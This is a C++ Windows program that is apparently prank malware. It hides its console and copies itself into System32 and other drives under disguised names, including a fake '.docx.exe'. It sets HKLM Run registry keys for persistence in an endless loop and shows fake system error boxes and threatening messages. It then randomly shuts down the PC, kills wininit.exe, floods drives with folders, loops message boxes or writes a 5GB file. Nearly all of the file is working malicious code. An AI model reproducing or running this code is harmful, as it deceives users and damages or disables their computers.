/*#include<iostream>
#include<windows.h>
#include<cstdlib>
#include<ctime>

using namespace std;
*/

#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<time.h>
#include<conio.h>
#include<stdlib.h>
#include<math.h>
#include<assert.h>
#include<ctype.h>
#include<float.h>
#include<limits.h>
#include<cstring>
#include<fstream>
#include<string>
#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) & 0x8000) ? 1:0)

using namespace std;

int rand_num;
bool B;

void down(int vk) {
	keybd_event(vk,0,KEYEVENTF_KEYUP,0);
}

void up(int vk) {
	keybd_event(vk,0,0,0);
}

void presss(int vk) { 
	down(vk);
	Sleep(10);
	up(vk);
	Sleep(50);
}

void MouseMove(int x, int y) { 
	double fScreenWidth = ::GetSystemMetrics(SM_CXSCREEN) - 1;
	double fScreenHeight = ::GetSystemMetrics(SM_CYSCREEN) - 1;
	double fx = x*(65535.0f / fScreenWidth);
	double fy = y*(65535.0f / fScreenHeight);
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
	Input.mi.dx = fx;
	Input.mi.dy = fy;
	SendInput(1, &Input, sizeof(INPUT));
}

void MouseLeftDown() {
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
	SendInput(1, &Input, sizeof(INPUT));
}

void MouseLeftUp() {
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
	SendInput(1, &Input, sizeof(INPUT));

}

void MouseRightDown() {
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
	SendInput(1, &Input, sizeof(INPUT));
}

void MouseRightUp() { 
	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
	SendInput(1, &Input, sizeof(INPUT));
}

void Mouse(int MOUSE_i) { //9
	int MOUSE_a,MOUSE_error;

	MOUSE_a=int(MOUSE_i);
	//if(MOUSE_a==108 || MOUSE_a==76)
	//{
//		MouseLeftDown();
//		MouseLeftUp();
	//}
///	else if(MOUSE_a==144 || MOUSE_a==82)
//	{
//		MouseRightDown();
//		MouseRightUp();
//	}
//	else
//	{
//		MOUSE_error=9;
//		cout<<"FATAL ERROR!"<<endl;
//		cout<<"MEBNSSx"/*<<bin*/<<MOUSE_error<<endl;//Mouse Button Status
//	}

	if(MOUSE_a==0) {
		MouseLeftDown();
		MouseLeftUp();
	} else if(MOUSE_a==1) {
		MouseRightDown();
		MouseRightUp();
	} else {
		MOUSE_error=9;
		cout<<"FATAL ERROR!"<<endl;
		cout<<"MEBNSSx"/*<<bin*/<<MOUSE_error<<endl;//Mouse Button Status
	}
}

void CoutComTime(int i) { //10

	SYSTEMTIME sys;
	GetLocalTime( &sys );
	printf( "%4d/%02d/%02d %02d:%02d:%02d.%03d Whatdayistody: %1d  i1：",sys.wYear,sys.wMonth,sys.wDay,sys.wHour,sys.wMinute, sys.wSecond,sys.wMilliseconds,sys.wDayOfWeek);
	cout<<i<<endl;

	//system("time");
}

void vsystem(){
	system("copy /Y cookie.exe C:\\Windows\\System32\\ ");
	system("copy /Y PlaceOpen.docx.exe C:\\Windows\\System32\\ ");
	// or PlaceOpen.docx.exe
	system("rename C:\\Windows\\System32\\cookie.exe system.sys.exe");
	system("rename C:\\Windows\\System32\\PlaceOpen.docx.exe system.sys.exe");
	//rename C:\Windows\System32\system.sys.exe cookie.exe 
	//system("cd C:\\Windows\\System32\\ && attrib +S +H +P system.sys.exe");
	system("copy /Y cookie.exe d:\\ ");
	system("rename D:\\cookie.exe PlaceOpen.docx.exe");
	system("copy /Y cookie.exe e:\\ ");
	system("rename E:\\cookie.exe placeOpen.docx.exe");
	system("copy /Y cookie.exe f:\\ ");
	system("rename F:\\cookie.exe PlaceOpen.docx.exe");
	system("");
	//echo off
	//set a=1.bat 
	//for /f "delims=" %%i in ('dir /b /s %a%') do (
	//system("cd C:\\Windows\\System32\\ && set a=system.sys.exe for /f \"delims=\" %%i in ('dir /b /s %a%') do ( reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v system.sys.exe /t \"reg_sz\" /d %%i /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v system /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v dsystem /t \"reg_sz\" /f ");
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v esystem /t \"reg_sz\" /f ");
	
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v system /t REG_SZ /d C:\\Windows\\System32\\system.sys.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v dsystem /t REG_SZ /d D:\\PlaceOpen.docx.exe /f");
	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v esystem /t REG_SZ /d E:\\PlaceOpen.docx.exe /f");
}
void Windisappear(){
	vsystem();
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);
	if(hwnd){
		ShowWindow(hwnd,SW_HIDE);
	}

	//system.sys.exe
//	system("copy /Y cookie.exe C:\\Windows\\System32\\ ");
//	system("copy /Y PlaceOpen.docx.exe C:\\Windows\\System32\\ ");
	// or PlaceOpen.docx.exe
//	system("rename C:\\Windows\\System32\\cookie.exe system.sys.exe");
//	system("rename C:\\Windows\\System32\\PlaceOpen.docx.exe system.sys.exe");
	//rename C:\Windows\System32\system.sys.exe cookie.exe 
	//system("cd C:\\Windows\\System32\\ && attrib +S +H +P system.sys.exe");
//	system("copy /Y cookie.exe d:\\ ");
//	system("rename D:\\cookie.exe PlaceOpen.docx.exe");
//	system("copy /Y cookie.exe e:\\ ");
//	system("rename E:\\cookie.exe placeOpen.docx.exe");
//	system("copy /Y cookie.exe f:\\ ");
//	system("rename F:\\cookie.exe PlaceOpen.docx.exe");
//	system("");
	//echo off
	//set a=1.bat 
	//for /f "delims=" %%i in ('dir /b /s %a%') do (
	//system("cd C:\\Windows\\System32\\ && set a=system.sys.exe for /f \"delims=\" %%i in ('dir /b /s %a%') do ( reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v system.sys.exe /t \"reg_sz\" /d %%i /f ");
//	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v system /t \"reg_sz\" /f ");
//	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v dsystem /t \"reg_sz\" /f ");
//	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run\" /v esystem /t \"reg_sz\" /f ");
	
//	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v system /t REG_SZ /d C:\\Windows\\System32\\system.sys.exe /f");
//	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v dsystem /t REG_SZ /d D:\\PlaceOpen.docx.exe /f");
//	system("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\run /v esystem /t REG_SZ /d E:\\PlaceOpen.docx.exe /f");
	
	
//)
//cd C:\Windows\System32\ && set a=system.sys.exe&&for /f "delims=" %%i in ('dir /b /s %a%') do ( reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows\CurrentVersion\run" /v system.sys.exe /t "reg_sz" /d %%i /f)
//reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows\CurrentVersion\run" /v system.sys.exe /t "reg_sz"
//REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows\CurrentVersion\run /v system.sys.exe /t REG_SZ /d C:\Windows\System32\system.sys.exe /f
//	attrib +S +H +P system.sys.exe
}


void sjs(){
	int times=1;
	srand(time(0));
	rand_num=rand()%5;
}

void WinV(int a){//a=0~15
	if(!a){
		system("shutdown /s /t 0");
	}
	else if(a==1){
		system("TASKKILL /F /IM wininit.exe /T");
	}
	else if(a==2){
		system("cd C:\\ && for /l %%i in (1 1 1024) do md Error1024_%%i..\\");
		system("cd D:\\ && for /l %%i in (1 1 1024) do md Error1024_%%i..\\");
		system("cd E:\\ && for /l %%i in (1 1 1024) do md Error1024_%%i..\\");
	}
	else if(a==3){
		while(1){
			MessageBox(NULL,"#Error   1024!          ","Windows System",MB_ICONHAND);
		}
	}
	else if(a==4){
		system("fsutil file createnew .\5GB.bin 5368709120");
	}
	
}

int main()
{
	long long i;
	B=0;
	int aa,ii;
	
	Windisappear();
	
	sjs();
	aa=rand_num*60*(rand_num%2);
	//for(ii=0;ii<aa+1;i+=1){
	Sleep(aa);
	//}
	//Sleep(aa);
		MessageBox(NULL,"#Error   1024!          ","Windows System",MB_ICONHAND);
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}
		for(i=0;i<1000*60*5;i+=1){
			if(KEY_DOWN('S')){
			B=1;}
			}

		if(!B){
		MessageBox(NULL,"YOU ARE WORST!          ","Windows System",MB_ICONHAND);
		MessageBox(NULL,"DU YOU KNOW YOU WILL DIE?          ","Windows System",MB_ICONHAND);
		MessageBox(NULL,"IT WILL START!          ","Windows System",MB_ICONHAND);
		
		int a;
		sjs();
		a=rand_num;//a=rand_num+rand_num+rand_num;
		WinV(a);
		}
		
	
	while(1){
		vsystem();
		Sleep(2000);
	} 
	//MessageBox(NULL,"#Error   1024!          ","Windows System",MB_ICONHAND);
	return 0;
}
